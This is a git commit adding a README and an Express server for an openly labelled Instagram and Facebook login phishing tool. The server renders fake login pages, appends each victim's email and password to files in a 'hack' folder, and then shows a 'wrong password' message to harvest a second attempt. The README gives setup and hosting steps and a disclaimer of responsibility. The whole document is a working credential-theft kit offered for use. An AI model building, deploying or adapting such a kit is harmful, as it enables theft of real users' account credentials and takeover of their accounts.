6c7b353e28578bd0fc88ea60e089a02c801f50df
arpitbhau <arpitnikhade20@gmail.com>
2024-05-22 13:01:06 +0530

    test commit

---
+++ README.md
@@ -0,0 +1,33 @@
+*** Instagram Login Phishing ***
+
+Requirements ==>
+
+  1. Node JS.
+  2. EJS
+  3. Express JS
+
+--- NOTE ---
+
+* Please do Create the "hack" named folder in the root directory for the details to be stored.
+
+
+Steps to do ==>
+
+  1. Install Node Js.
+  2. Execute these Commnands in the folder where the Phshing Attack is kept ==>
+     1. npm i ejs
+     2. npm i express
+  3. Host the Node JS Server
+  4. The Details when entered by victim will be immidiately saved in the folder named "hack"
+
+
+# Please See 
+   1. The username is coverd by +++ . e.g username is arpit so the username in file will be +++arpit+++
+   2. Similarly, Password will be covered by ***
+
+
+
+
+|****************************************************************************|
+| Any UnEthical Activity done by this tool. I will not be responsible for it |
+|****************************************************************************|
---
+++ server.js
@@ -0,0 +1,66 @@
+// JAI SHREE RAM
+
+
+var express = require('express')
+var app = express()
+var fs = require("fs")
+
+
+app.use(express.static("./public"))
+
+app.set("view engine" , "ejs")
+
+
+
+function show(data) {
+  console.log(data)
+}
+
+
+app.get("/", function (req, res) {
+  res.render("insta" , {wrongpass: "Login with Facebook." , or: "OR"})
+  show("Some One Just Entered.")
+})
+
+app.get("/continueInstagram/:logvia" , function (req , res) {
+  
+  const email = req.query.email
+  const passwd = req.query.password
+  const logvia = req.params.logvia
+
+  fs.appendFile(`./hack/${logvia}/${email}.txt` , `+++${email}+++\n***${passwd}***\n` , (err) => {
+    if (err) {
+      res.send("/swr")
+    }else{
+      res.redirect(`/loginAgain/${logvia}`)
+    }
+  })
+
+
+})
+
+app.get("/swr" , function (req , res) {
+  res.redirect("/" , {wrongpass: "Sorry! Something Went Wrong.\nPlease try Again." , or: ""})
+})
+
+app.get("/loginAgain/:via" , function (req , res) {
+
+  const via = req.params.via
+
+
+  if (via === `instagram`) res.render("insta" , {wrongpass : "Your Username or Password is Incorrect.\nPlease try agin." , or: ""})
+
+  else if (via === `facebook`) res.render("fb" , {fbwrongpass : "Your Username or Password is Incorrect!.\nPlease try agin."})
+
+  else res.redirect("/swr")
+})
+
+app.get("/facebook/login" , function (req , res) {
+  res.render("fb" , {fbwrongpass: "Forgot your Password ?"})
+})
+
+
+
+
+
+app.listen(3000)
